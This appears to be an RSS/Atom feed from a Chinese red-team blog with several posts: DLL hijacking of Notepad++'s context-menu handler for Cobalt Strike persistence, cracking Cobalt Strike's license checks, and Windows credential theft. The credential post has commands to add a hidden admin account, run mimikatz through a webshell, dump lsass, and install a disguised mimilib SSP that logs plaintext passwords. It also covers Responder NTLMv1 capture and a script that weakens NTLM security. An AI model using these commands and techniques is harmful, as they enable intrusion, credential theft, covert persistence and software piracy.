class="line">@&#x3D;&quot;&#123;B298D29A-A6ED-11DE-BA8C-A68E55D89593&#125;&quot;</span><br></pre></td></tr></table></figure><p>也就是说只需要将安装文件中的 <code>NppShell_06.dll</code> 拷贝到绿色版文件中，并将上述变动导入注册表就可以手动实现添加右键打开的功能，不过该操作需要管理员权限。</p><ul><li><code>regedit /s nppi.reg</code></li></ul><p>构造了还不错的触发条件后，接下来将原dll更名为 <code>NppShell_05.dll</code>、找出导出函数，在我们的恶意dll中按顺序转发原函数调用并附加恶意操作（比如加载shellcode），目前已经有很多成熟的工具可以帮助找出这些导出函数们：</p><p><img src="/img/lydllhj_e.png"></p><ul><li>开始调试时为了避免干扰因素，通常不会直接上shellcode而是用MessageBox弹窗做试验</li></ul><h2 id="免杀与权限维持"><a href="#免杀与权限维持" class="headerlink" title="免杀与权限维持"></a>免杀与权限维持</h2><p>将恶意dll的shellcode简单处理一下后再伪造一个原dll的签名，此时就是正常签名程序-&gt;伪造签名的dll-&gt;正常签名的dll，测试了几款主流杀软和defender，可以挺人畜无害地上线CS：</p><p><img src="/img/lydllhj_f.png"></p><p><img src="/img/lydllhj_g.png"></p><p><img src="/img/lydllhj_h.png"></p><p>对于权限维持而言，恶意dll会在第一次导入注册表操作时加载，之后可由任意文件上右键的行为被explore进程拉起，不会在任务管理器中看到恶意进程，也没有类似于开机自启这种敏感行为。而且有意思的是管理员会因为右键用杀软扫描文件的行为而上线2333</p><hr><p>这是Web狗学习Windows的一点小测试记录，希望师傅们能分享更多好玩的tricks鸭～</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#standard-search-order-for-desktop-applications">Dynamic-Link Library Search Order</a></p><p><a href="https://itm4n.github.io/windows-dll-hijacking-clarified/">Windows DLL Hijacking (Hopefully) Clarified</a></p><p><a href="https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows">Hijacking DLLs in Windows</a></p><p><a href="https://www.netspi.com/blog/technical/adversary-simulation/adaptive-dll-hijacking/">Adaptive DLL Hijacking</a></p><p><a href="https://printempw.github.io/add-notepad-plus-plus-to-context-menu/">添加 Notepad++ 至右键菜单的几种方法</a></p><p><a href="https://www.anquanke.com/post/id/232891">DLL劫持之权限维持篇（二）</a></p><p><a href="https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html">shellcode加载总结</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;根据软件工程高内聚低耦合的思想，把程序要重复使用的代码封装成函数/类方法，将软件要重复使用的程序封装成链接库。库分为静态链接库和动态链接库，静态链接库顾名思义就是在程序链接阶段打包进文件中，而动态链接库则是在程序运行时再导入调用。动态链接库有着加载时复用节省内存、补丁更新时</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="dll" scheme="https://hosch3n.github.io/tags/dll/"/>
    
    <category term="hijack" scheme="https://hosch3n.github.io/tags/hijack/"/>
    
  </entry>
  
  <entry>
    <title>CS43伪破解与二次开发</title>
    <link href="https://hosch3n.github.io/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/"/>
    <id>https://hosch3n.github.io/2021/05/29/CS43%E4%BC%AA%E7%A0%B4%E8%A7%A3%E4%B8%8E%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91/</id>
    <published>2021-05-29T12:57:09.000Z</published>
    <updated>2021-06-13T02:21:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>cobaltstrike.auth是被RSA私钥签名（加密）的授权文件，客户端加载时会利用内置的RSA公钥对其解密，解析获取到试用水印、授权版本、有效期、AES密钥、HMAC等内容。关键的AES密钥和HMAC256用于连接服务器时，解密和校验sleeve中的动态链接库。</p><h2 id="LV0"><a href="#LV0" class="headerlink" title="LV0"></a>LV0</h2><p>破解cobaltstrike 4.x的前提是要么得到了泄漏的auth文件（或里面的关键key），要么得到了解密后的sleeve中的动态链接库。</p><h2 id="LV1"><a href="#LV1" class="headerlink" title="LV1"></a>LV1</h2><p>当得到了<a href="https://www.upload.ee/files/13104600/cobaltstrike.jar.html">原版Jar包</a>、重新签发的<a href="https://hosch3n.github.io/files/cobaltstrike.auth">auth文件</a>和对应的<a href="https://hosch3n.github.io/files/authkey.pub">公钥</a>时，只需替换官方内置的公钥即可。具体操作如下：</p><p>I. 反编译原版Jar包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用IDEA目录中的 plugins/java-decompiler/lib/java-decompiler.jar 反编译源码至ex目录中</span></span><br><span class="line">java -cp ./java-decompiler.jar org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class="literal">true</span> ./cobaltstrike.jar ./ex</span><br></pre></td></tr></table></figure><p>II. 新建项目并将原版Jar包作为依赖加载，配置好Artifacts</p><p><img src="/img/cswpjyek_a.png"></p><p>III. 解压反编译后的jar包，替换resources/authkey.pub，修改common/AuthCrypto中的md5校验为公钥对应的哈希<code>5e5c629ad2673a45b4d3c69984dbdf36</code></p><p>IV. 将beacon/BeaconData中49行的<code>this.shouldPad</code>修改为false，去除exit</p><h2 id="LV2"><a href="#LV2" class="headerlink" title="LV2"></a>LV2</h2><p>基于原版Jar包和关键key，根据逆向的代码逻辑倒推出auth文件内容，自己生成RSA密钥对并签发auth文件。</p><p>由common/Authorization可以看出，auth文件中存放的字节数组依次为4位文件头、2位文件长度、4位有效期、4位水印、1位有效版本、3x(1+16)位未起作用的数据（1位用于标识长度，猜测是官方用于定位原auth文件的购买者身份？）、1位标识关键key长度、关键key。</p><p><img src="/img/cswpjyek_b.png"></p><h2 id="LV3"><a href="#LV3" class="headerlink" title="LV3"></a>LV3</h2><p>利用关键key解密sleeve中的动态链接库，修改common/SleevedResource中的解密逻辑为直接返回原资源。</p><p>修改beacon/BeaconPayload中的抑或key，同时通过机器码特征定位修改dll中的抑或key。废除cloudstrike/WebServer中checksum8上线机制。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://raidforums.com/Thread-Cobalt-Strike-4-3-March-17-2021-bug-fixes?page=4">Cobalt Strike 4.3 (March 17, 2021) [bug fixes]</a></p><p><a href="https://verify.cobaltstrike.com/">官网SHA256哈希校验</a></p><p><a href="https://rcoil.me/2020/11/%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91Cobalt%20Strike%204.0%E8%AE%A4%E8%AF%81%E5%8F%8A%E4%BF%AE%E8%A1%A5%E8%BF%87%E7%A8%8B/">【知识回顾】Cobalt Strike 4.0 认证及修补过程</a></p><p><a href="https://www.bilibili.com/video/BV1yz411i71Z?p=10">RedCore红队学院CSTips</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;cobaltstrike.auth是被RSA私钥签名（加密）的授权文件，客户端加载时会利用内置的RSA公钥对其解密，解析获取到试用水印、授权版本、有效期、AES密钥、HMAC等内容。关键的AES密钥和HMAC256用于连接服务器时，解密和校验sleeve中的动态链接库。&lt;/</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="idea" scheme="https://hosch3n.github.io/tags/idea/"/>
    
    <category term="jar" scheme="https://hosch3n.github.io/tags/jar/"/>
    
    <category term="rsa" scheme="https://hosch3n.github.io/tags/rsa/"/>
    
    <category term="aes" scheme="https://hosch3n.github.io/tags/aes/"/>
    
    <category term="hmac" scheme="https://hosch3n.github.io/tags/hmac/"/>
    
  </entry>
  
  <entry>
    <title>Windows凭据窃取（一）</title>
    <link href="https://hosch3n.github.io/2021/03/10/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2021/03/10/Windows%E5%87%AD%E6%8D%AE%E7%AA%83%E5%8F%96%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2021-03-10T15:48:05.000Z</published>
    <updated>2021-08-21T04:08:10.200Z</updated>
    
    <content type="html"><![CDATA[<p><em>管中窥豹，可见一斑。Windows密钥窃取防护与绕过技术的背后，是红蓝对抗大环境的更新迭代。–hosch3n瞎编的</em> </p><h2 id="Mimikatz非交互执行"><a href="#Mimikatz非交互执行" class="headerlink" title="Mimikatz非交互执行"></a>Mimikatz非交互执行</h2><p>在很久很久以前，通过<code>高卢神器Mimikatz</code>扒Windows的系统密码，就已经是横向移动的标配手段之一。那时候，运维对 AV / EDR / IDS / IPS 还没什么概念，更不用提威胁情报、欺骗防御了。于是只要找个论坛下载原封不动编译好的猕猴桃，远程桌面连上去就能扒下更多的账户密码。</p><p>可能有同学要怼我了，你密码都不知道怎么连远程桌面扒密码？前辈们其实也遇到了这个问题，所以除了RDP密码泄漏这种途径，常常会先添加一个伪装成机器用户的管理员：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:: 添加用户</span><br><span class="line"><span class="built_in">net</span> user system$ Passw0rd! /add</span><br><span class="line">:: 加入管理员组</span><br><span class="line"><span class="built_in">net</span> localgroup administrators system$ /add</span><br><span class="line">:: 开启远程登录</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line">:: 查询端口</span><br><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber</span><br></pre></td></tr></table></figure><p>又或者通过WebShell非交互式地将输出重定向到文件：</p><p><code>mimikatz.exe &quot;&quot;privilege::debug&quot;&quot; &quot;&quot;sekurlsa::logonpasswords full&quot;&quot; exit &gt;&gt; hash.txt</code></p><p>这引起了某些反病毒软件（AV）的注意，它们将<code>“mimikatz”</code>加入了特征库，也有的会拦截WebShell加系统用户的行为。这时常用的绕过技术有了两条分支，一种是对mimikatz做免杀，另一种是dump存在密钥的lsass进程。</p><h2 id="免杀Mimikatz"><a href="#免杀Mimikatz" class="headerlink" title="免杀Mimikatz"></a>免杀Mimikatz</h2><p>先聊聊对Mimikatz做免杀，反病毒软件两大主要的着力点应该就是对静态特征和动态行为的查杀了，绕过静态特征查杀的基础就是修改特征码。AV厂商（<em>怎么怪怪的</em>）自然会选取正常软件几乎没有，而恶意软件特有的东西作为特征来规避误报。无论是WebShell脚本还是恶意软件的免杀，就是伪装成正常文件逃避检测，因此定个小目标，伪装成<code>SysinternalsSuite</code>的<code>PsExec64.exe</code>。</p><p>浏览一遍源码，感觉可能被用作特征码的字段有这些：</p><p><img src="/img/winkeyqqa_a.png"></p><p>批量将其改为psexec、pslib等，并修复头文件引用。</p><p>项目中的<code>*.rc</code>文件标识着程序元信息：</p><p><img src="/img/winkeyqqa_b.png"></p><p>查看PsExec64.exe的元信息会因为窗口大小被遮挡一部分（无法调整窗口大小），一些括号等特殊符号肉眼也无法区分是半角还是全角、周围有没有空格，手敲模仿不但累还容易敲错。</p><p><img src="/img/winkeyqqa_c.png"></p><p>可以利用<a href="https://github.com/Dijji/FileMeta">FileMeta</a>项目将exe文件元信息设置为可编辑，复制后替换Mimikatz的元信息。</p><p><img src="/img/winkeyqqa_d.png"></p><p>mimilib子项目加载Dll后会生成log记录文件：</p><p><img src="/img/winkeyqqa_e.png"></p><p>通常会将mimilib.dll放在system32路径下，出现log文件显然不正常，同时注意到文件写入均为追加模式，我们将这些<code>*.log</code>文件批量替换为<code>msgsm64.acm</code>用于伪装。</p><p>编译完成后利用<a href="https://github.com/secretsquirrel/SigThief">SigThief</a>项目给生成的exe和dll加上<code>PsExec64.exe</code>的证书，强行偷来的证书校验自然是对不上的，目前某些杀软可能是出于 性能 / 误报 考虑，似乎并未对白签名证书程序进行校验。</p><p><img src="/img/winkeyqqa_f.png"></p><p>也可通过PowerSploit的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-EncryptedScript.ps1">Out-EncryptedScript</a>脚本，生成加密的<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1">Invoke-Mimikatz</a>绕过AV。</p><ul><li>绕过行为特征查杀目前已有多种内存申请、进程注入、规避敏感接口等等方法，但这不是本文的重点之后有缘再聊。</li></ul><h2 id="进程dump"><a href="#进程dump" class="headerlink" title="进程dump"></a>进程dump</h2><p>静态免杀能过动态行为不一定能过，上面纯属耍小聪明运气好罢了，Mimikatz本身调用了大量WinAPI，改起来有亿点门槛。在网络环境好的情况下，可以dump出lsass进程并将内存dump文件下载回本地读取：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonPasswords full&quot; <span class="keyword">exit</span></span><br></pre></td></tr></table></figure><p>起初可以用各种工具Dump lsass进程，后来一般只有<code>SysinternalsSuite</code>的<code>procdump</code>才不会告警了。</p><ul><li>GUI环境下也可以利用任务管理器等程序</li></ul><h2 id="AddSecurityPackage"><a href="#AddSecurityPackage" class="headerlink" title="AddSecurityPackage"></a>AddSecurityPackage</h2><p>虽然部分杀软对procdump不告警，但在网络环境恶劣的内网还是相当不友好，再如果碰上有卡巴斯基的机器更是直接嗝屁：</p><p><img src="/img/winkeyqqa_g.png"></p><p>至此我们需要了解一个叫SSP（Security Support Provider）的东西，它是SSPI（Security Support Provider Interface）这个Windows认证API的具体dll实现，通过<code>EnumerateSecurityPackages</code>接口可以枚举出已加载的SSP。mimilib.dll就具备SSP的功能，需要在注册表中添加Dll路径并调用<a href="https://docs.microsoft.com/en-us/windows/win32/api/sspi/nf-sspi-addsecuritypackagea">AddSecurityPackage API</a>加载SSP（或者重启）：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; /v &quot;Security Packages&quot; /t REG_MULTI_SZ /d &quot;pslib64.dll&quot; /f</span><br></pre></td></tr></table></figure><p><img src="/img/winkeyqqa_h.png"></p><ul><li>放在System32目录的pslib64.dll为免杀的mimilib.dll，图中伪装为<code>DPA SSP</code></li></ul><p>发生锁屏登录或是runas等认证行为后，会将明文密码记录在System32下的<code>msgsm64.acm</code>中（默认在kiwissp.log）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[00000000:000003e7] [00000002] WORKGROUP\WIN2019$ (WIN2019$)</span><br><span class="line">[00000000:0000b1bd] [00000002] WORKGROUP\WIN2019$ (UMFD-0)</span><br><span class="line">[00000000:0000b1dd] [00000002] WORKGROUP\WIN2019$ (UMFD-1)</span><br><span class="line">[00000000:000003e4] [00000005] WORKGROUP\WIN2019$ (NETWORK SERVICE)</span><br><span class="line">[00000000:000108e8] [00000002] WORKGROUP\WIN2019$ (DWM-1)</span><br><span class="line">[00000000:00010927] [00000002] WORKGROUP\WIN2019$ (DWM-1)</span><br><span class="line">[00000000:000003e5] [00000005] \ (LOCAL SERVICE)</span><br><span class="line">[00000000:000205d2] [00000002] WIN2019\ryan (ryan)toor</span><br><span class="line">[00000000:0002064b] [00000002] WIN2019\ryan (ryan)toor</span><br></pre></td></tr></table></figure><p>这样做好处就是能扒到明文密码、会进行持久化更新和记录，坏处就是Dll要免杀、有时候也并不一定要持久化或是拿到明文密码才行，并且需要修改注册表、调用<code>AddSecurityPackage API</code>、可被<code>EnumerateSecurityPackages API</code>枚举查看、还要等一个有缘人触发登录行为。</p><p>很多时候会有点得不偿失，于是XPN在对<code>Mimikatz</code>和<code>Secur32.dll</code>跟进深入分析后，发现了以下几个要点：</p><ol><li><p>WDigest会调用SpAcceptCredentials缓存凭据</p></li><li><p>Mimilib在明文凭据传入调用后将其保存到文件里</p></li><li><p>MemSSP搜索lsass进程中的<code>msv1_0.dll</code>，通过<code>WriteProcessMemory</code> Hook <code>SpAcceptCredentials</code></p></li><li><p><code>AddSecurityPackage API</code>会通过<code>SspirCallRpc</code>调用<code>lsass</code>，通知<code>lsass</code>加载SSP</p></li></ol><p>在<a href="https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e">Github Gist</a>有不使用<code>AddSecurityPackage API</code>加载Dll的代码，咱们对其稍作修改：</p><ol><li><p>引入静态链接库<code>#pragma comment(lib, &quot;Rpcrt4.lib&quot;)</code></p></li><li><p>修改工程字符集为<code>Use Multi-Byte Character Set</code></p></li></ol><p><img src="/img/winkeyqqa_i.png"></p><ol start="3"><li>为了用起来方便，将原本的绝对路径加载Dll改为相对相对路径加载（可以用判断目录等方式实现兼容绝对路径和相对路径，但懒得搞感觉不是很必要）</li></ol><p><img src="/img/winkeyqqa_j.png"></p><ol start="4"><li>最后整一个查找lsass进程并Dump内存的Dll：</li></ol><p><img src="/img/winkeyqqa_l.png"></p><ol start="5"><li>利用RPC调用lsass加载Dll并Dump自身内存：</li></ol><p><img src="/img/winkeyqqa_m.png"></p><p>好处是无需修改注册表、枚举SSP查不到，坏处是网络环境恶劣时不方便将Dump文件下载回来，所以也可以考虑用XPN公布的<a href="https://gist.github.com/xpn/93f2b75bf086baf2c388b2ddd50fb5d0">memssp版Dll</a>。</p><h2 id="Net-NTLMv1"><a href="#Net-NTLMv1" class="headerlink" title="Net-NTLMv1"></a>Net-NTLMv1</h2><p>为了缓解内存中WDigest的明文密码泄漏，微软发布了KB2871997（当然这个补丁作用不止于此），会在登录后将明文缓存清除掉，并且限制本地Administrator（RID 500）和本地管理员组的域用户之外的用户进行PTH（比如本地管理员组的其它用户不行）。</p><p>PassTheHash（PTH）通常是指利用NTLM哈希完成Windows身份认证这一类行为，具体可通过<code>mimikatz</code>、<code>psexec</code>、<code>smbexec</code>、<code>atexec</code>、<code>wmiexec</code>、<code>dcomexec</code>、<code>WinRM</code>等等实现。但我们不妨思考一下，为什么可以不需要明文密码？</p><p>Web应用通常是服务端收到HTTP/S传输来的明文密码（当然也有会前端加密的），在<strong>服务端</strong>对明文密码哈希计算并与数据库中存储的密码哈希比对，所以得到密码哈希后，需要由彩虹表查出明文密码才能登录。但NTLM身份认证是由<strong>客户端</strong>将用户输入的明文密码转化为NTLM哈希并加密为Net-NTLM后再由SMB、HTTP等协议传输，这就是为什么很多时候并不需要明文密码。</p><p>LM哈希（LAN Manager Hash）是NT5系列操作系统的密码默认加密方式，将明文规则变换后进行DES加密。实现方式使其可加密的最大长度为14、无法区分大小写、密文强度不高。</p><p><img src="/img/winkeyqqa_n.png"></p><p>随后微软设计了基于challenge/response机制的NTLM（NT LAN Manage)身份验证协议，从NT6操作系统开始将NTLM Hash作为密码默认加密方式。</p><p><img src="/img/winkeyqqa_o.png"></p><ol><li><p>在进行身份认证的过程中，客户端会以NTLM哈希作为密钥，通过3DES（NTLMv1）/ HMAC-MD5（NTLMv2）算法加密服务端发来的challenge，进行规则变换后最终得到net-ntlm哈希。</p></li><li><p>服务端取出密码库里存的NTLM哈希，以同样的算法加密challenge，比对客户端发来的net-ntlm哈希判断密码是否正确。</p></li><li><p>如果是域环境则密码库可能不在同一个服务端（在域控上），此时服务端会由Pass Through Authentication机制，通过netlogon协议向域控转发客户端信息。</p></li></ol><p><img src="/img/winkeyqqa_p.png"></p><p>其中NTLMv1根据有无<code>Client Challenge</code>参与，可分为第一种Net-NTLMv1哈希和另一种Net-NTLMv1-SSP哈希。而第一种Net-NTLMv1哈希因实现方式的问题，导致可以设置一个固定的<code>Sever Challenge</code>（1122334455667788）建立<a href="https://github.com/lgandx/Responder">Rogue Server</a>，在目标系统向我们建立的恶意服务器发起SMB请求（最简单的就是访问一个UNC路径<code>\\1.1.1.1</code>），通过<a href="https://crack.sh/get-cracking/">彩虹表</a>可查到解密后的NTLM哈希。</p><p><code>sudo ./Responder.py -I wlp2s0 -wrfv --lm</code></p><p><img src="/img/winkeyqqa_q.png"></p><p>这样就可不对Lsass进程毛手毛脚就获取到NTLM哈希，当然也可以尝试更进一步通过彩虹表查出NTLM哈希对应的明文密码。</p><p><img src="/img/winkeyqqa_k.png"></p><p>不过实际利用中可能会出现这种情况：</p><p><img src="/img/winkeyqqa_r.png"></p><p>这是因为<a href="https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/smbv1-not-installed-by-default-in-windows">高版本</a>的Windows服务器上可能不存在SMBv1客户端，其次LMCompatibilityLevel的值也会有影响。可以利用PowerShell修改注册表并安装SMBv1客户端，<strong>注意会导致系统重启！</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Set-Relay</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># LMCompatibilityLevel</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\&quot;</span> /v lmcompatibilitylevel /t REG_DWORD /d <span class="number">2</span> /f</span><br><span class="line"><span class="comment"># NTLMMinClientSec</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v NtlmMinClientSec /t REG_DWORD /d <span class="number">536870912</span> /f</span><br><span class="line"><span class="comment"># RestrictSendingNTLMTraffic</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\&quot;</span> /v RestrictSendingNTLMTraffic /t REG_DWORD /d <span class="number">0</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable SMBv1</span></span><br><span class="line"><span class="built_in">Enable-WindowsOptionalFeature</span> <span class="literal">-Online</span> <span class="literal">-FeatureName</span> smb1protocol</span><br><span class="line"><span class="comment"># DisableLoopbackCheck</span></span><br><span class="line">reg add <span class="string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\&quot;</span> /v LsaDisableLoopbackCheck /t REG_DWORD /d <span class="number">1</span> /f</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Set-Relay</span></span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.xpnsec.com/exploring-mimikatz-part-2/">Exploring Mimikatz - Part 2 - SSP</a></p><p><a href="https://3gstudent.github.io/3gstudent.github.io/Mimikatz%E4%B8%ADSSP%E7%9A%84%E4%BD%BF%E7%94%A8/">Mimikatz中SSP的使用</a></p><p><a href="https://blog.ateam.qianxin.com/post/zhe-shi-yi-pian-bu-yi-yang-de-zhen-shi-shen-tou-ce-shi-an-li-fen-xi-wen-zhang/#44-%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA%E7%9A%84%E5%AF%B9%E6%8A%97">这是一篇“不一样”的真实渗透测试案例分析文章</a></p><p><a href="https://mp.weixin.qq.com/s/K-gA9UOyjT7y51ZqmHGnNw">dump lass 工具</a></p><p><a href="https://www.mrwu.red/web/2000.html">通过Windows蓝屏文件来绕过kaspersky的内存保护抓密码</a></p><p><a href="https://www.sans.org/blog/protecting-privileged-domain-accounts-network-authentication-in-depth/">Protecting Privileged Domain Accounts: Network Authentication In-Depth</a></p><p><a href="https://daiker.gitbook.io/windows-protocol/ntlm-pian/6#1-netntlm-v1-de-po-jie">Net-NTLM v1 的破解</a></p><p><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level">Network security: LAN Manager authentication level</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;管中窥豹，可见一斑。Windows密钥窃取防护与绕过技术的背后，是红蓝对抗大环境的更新迭代。–hosch3n瞎编的&lt;/em&gt; &lt;/p&gt;
&lt;h2 id=&quot;Mimikatz非交互执行&quot;&gt;&lt;a href=&quot;#Mimikatz非交互执行&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="ntlm" scheme="https://hosch3n.github.io/tags/ntlm/"/>
    
    <category term="mimikatz" scheme="https://hosch3n.github.io/tags/mimikatz/"/>
    
    <category term="mimilib" scheme="https://hosch3n.github.io/tags/mimilib/"/>
    
    <category term="ssp" scheme="https://hosch3n.github.io/tags/ssp/"/>
    
  </entry>
  
  <entry>
    <title>Windows权限维持[整理中]</title>
    <link href="https://hosch3n.github.io/2021/01/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    <id>https://hosch3n.github.io/2021/01/11/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</id>
    <published>2021-01-11T06:28:29.000Z</published>
    <updated>2021-08-21T04:09:45.333Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="53d539a7ff24c8c47cddab81f3a59dca1e5482b25c5bf8ac501c17ee87babb69"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="红蓝对抗" scheme="https://hosch3n.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
    <category term="startup" scheme="https://hosch3n.github.io/tags/startup/"/>
    
    <category term="reg" scheme="https://hosch3n.github.io/tags/reg/"/>
    
    <category term="service" scheme="https://hosch3n.github.io/tags/service/"/>
    
    <category term="dll" scheme="https://hosch3n.github.io/tags/dll/"/>
    
    <category term="bitsadmin" scheme="https://hosch3n.github.io/tags/bitsadmin/"/>
    
    <category term="MCT" scheme="https://hosch3n.github.io/tags/MCT/"/>
    
    <category term="wmi" scheme="https://hosch3n.github.io/tags/wmi/"/>
    
    <category term="IFEO" scheme="https://hosch3n.github.io/tags/IFEO/"/>
    
    <category term="gflags" scheme="https://hosch3n.github.io/tags/gflags/"/>
    
    <category term="system$" scheme="https://hosch3n.github.io/tags/system/"/>
    
  </entry>
  
  <entry>
    <title>检测与隐藏Cobaltstrike服务器</title>
    <link href="https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://hosch3n.github.io/2020/12/16/%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8FCobaltstrike%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2020-12-16T01:38:12.000Z</published>
    <updated>2021-03-22T05:50:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文是对CS服务器检测与隐藏方法的学习总结，介绍检测方法的同时浅析相应隐藏方法的原理，并动手一步一步的修改相应特征值，搭建出一个不易被标记的基础服务器。</p><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2><p>CS服务器默认监听在50050端口，可以在启动前编辑<code>teamserver</code>文件更改监听端口：</p><p><code>sed -i &#39;s/50050/10080/g&#39; teamserver</code></p><ul><li>至于能不能有一点卵用就见仁见智了，只能说类似于将Tomcat从8080改到9090</li></ul><h2 id="默认证书"><a href="#默认证书" class="headerlink" title="默认证书"></a>默认证书</h2><p>接着进行全端口扫描，看到默认证书中存在CS证书签发者的相关信息，我们可以用keytool重签一个伪造的证书。</p><p><img src="/img/jcyyccss_a.png"></p><p><code>keytool</code>是一个装好JDK就会有的Java证书管理工具，输入命令<code>keytool -list -v -keystore cobaltstrike.store -storepass 123456</code>详细列出证书各条目信息。</p><p><img src="/img/jcyyccss_b.png"></p><p>然后删除默认的并重签一个伪造证书，重启CS后再用<code>nmap -p- -A -vv</code>扫描时已经消除该特征。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm ./cobaltstrike.store</span><br><span class="line">sed -i <span class="string">&#x27;s!-alias cobaltstrike -dname 